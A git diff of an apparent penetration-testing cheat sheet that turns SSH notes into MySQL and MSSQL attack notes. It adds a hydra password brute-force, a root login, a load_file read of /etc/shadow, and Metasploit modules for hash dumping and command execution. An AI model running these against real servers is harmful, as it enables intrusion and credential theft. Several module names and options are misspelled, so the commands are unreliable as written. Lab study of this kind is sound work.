@@ -1,6 +1,4 @@
-# **SSH**
-
-## **Secure Shell 22**
+# **SQL**
 
 --------------------------------------------------------------------
 
@@ -48,7 +46,7 @@ nmap 0.0.0.0 -p 1433 —script ms-sql-xp-cmdshell —script-args mssql.username=
 ### BRUTEFORCE
 
 ```
-$ hydra -l student -P /usr/share/wordlists/rockyou.txt ssh
+$ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 0.0.0.0 mysql
 ```
 
 --------------------------------------------------------------------
@@ -56,19 +54,64 @@ $ hydra -l student -P /usr/share/wordlists/rockyou.txt ssh
 ### Trying login
 
 ```
-$ ssh root@0.0.0.0 
-
-$ nc 0.0.0.0 22
+$ mysql -h 0.0.0.0 -u root
 ```
 
 --------------------------------------------------------------------
 
-### Metasploit
+### Useful SQL Commands
 
 ```
-$ msfconsole 
-> use auxiliary/scanner/ssh/ssh_login
-> set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
+$ show databases;
+
+$ use books;
+
+$ select * from authors;
+
+$ select load_file(”/etc/shadow”)
+```
+
+--------------------------------------------------------------------
+
+### Metasploit Modules
+
+```
+> MYSQL:
+
+- use /auxiliary/scanner/mysql/mysql_login
+> set pass_file /usr/share/metasploit_framework/data/wordlists/unix_passwords.txt
+> set stop_on_succes true
+
+- auxiliary/admin/mysql/mysql_enum
+
+- auxiliary/admin/mysql/mysql_sql
+
+- auxiliary/scanner/mysql/mysql_file_enum
+
+- auxiliary/scanner/mysql/mysql_hashdump
+
+- auxiliary/scanner/mysql/mysql_login
+
+- auxiliary/scanner/mysql/mysql_schemadump
+
+- auxiliary/scanner/mysql/mysql_version
+
+- auxiliary/scanner/mysql/mysql_writable_dirs
+
+
+> MSSQL:
+
+- use auxiliary/scanner/mssql/mssql_login
+> set user_file /root/Desktop/wordlist/common_users.txt
+> set pass_file…
+
+- use auxiliary/admin/ssql/ssql_enum
+
+- use auxiliary/admin/ssql/ssql_enum_ssql_logins
+
+- use auxiliary/admin/ssql/ssql_exec
+
+- use auxiliary/admin/ssql/ssql_enum_domain_accounts
 ```
 
 --------------------------------------------------------------------
